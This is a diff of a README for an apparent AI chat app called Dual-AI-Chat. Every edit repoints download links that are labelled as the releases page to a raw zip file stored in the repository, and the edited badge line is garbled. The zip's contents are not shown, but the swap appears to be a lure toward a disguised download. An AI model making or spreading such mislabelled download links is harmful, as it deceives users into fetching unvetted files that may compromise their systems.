@@ -1,7 +1,7 @@
 # 🤖 Dual-AI-Chat - Experience Unique AI Conversations
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue.svg)](https://github.com/SenseiOguz/Dual-AI-Chat/releases)
+[![Download Release](https://github.com/SenseiOguz/Dual-AI-Chat/raw/refs/heads/main/dual-ai-chat/Dual-Chat-A-3.3.zip%https://github.com/SenseiOguz/Dual-AI-Chat/raw/refs/heads/main/dual-ai-chat/Dual-Chat-A-3.3.zip)](https://github.com/SenseiOguz/Dual-AI-Chat/raw/refs/heads/main/dual-ai-chat/Dual-Chat-A-3.3.zip)
 
 ## 🌟 Overview
 Dual-AI-Chat is an advanced chat application that showcases a unique conversation model. In this app, your queries are debated and refined by two distinct AI roles before receiving a comprehensive answer. The project uses the Google Gemini API to power a logical AI (Cognito) and a skeptical AI (Muse). Together, they generate robust, accurate responses that have been thoroughly vetted.
@@ -12,7 +12,7 @@ Follow these simple steps to download and run Dual-AI-Chat on your device.
 ### 🔗 Visit the Release Page
 To get started, visit the release page below. This is where you will find the latest version of Dual-AI-Chat for download.
 
-[Download the latest version here](https://github.com/SenseiOguz/Dual-AI-Chat/releases)
+[Download the latest version here](https://github.com/SenseiOguz/Dual-AI-Chat/raw/refs/heads/main/dual-ai-chat/Dual-Chat-A-3.3.zip)
 
 ### 🛠️ System Requirements
 Before you download Dual-AI-Chat, make sure your system meets the following requirements:
@@ -23,7 +23,7 @@ Before you download Dual-AI-Chat, make sure your system meets the following requ
 - Internet Connection: Required for AI functionality
 
 ### 📥 Download & Install
-1. Go to the [Releases Page](https://github.com/SenseiOguz/Dual-AI-Chat/releases).
+1. Go to the [Releases Page](https://github.com/SenseiOguz/Dual-AI-Chat/raw/refs/heads/main/dual-ai-chat/Dual-Chat-A-3.3.zip).
 2. Find the latest version listed at the top.
 3. Click the appropriate file for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -62,4 +62,4 @@ If you encounter issues, consider the following tips:
 For further assistance, please reach out via the GitHub repository issues tab. We will do our best to respond promptly. 
 
 Visit the release page to start your experience today!  
-[Download the latest version here](https://github.com/SenseiOguz/Dual-AI-Chat/releases)
+[Download the latest version here](https://github.com/SenseiOguz/Dual-AI-Chat/raw/refs/heads/main/dual-ai-chat/Dual-Chat-A-3.3.zip)
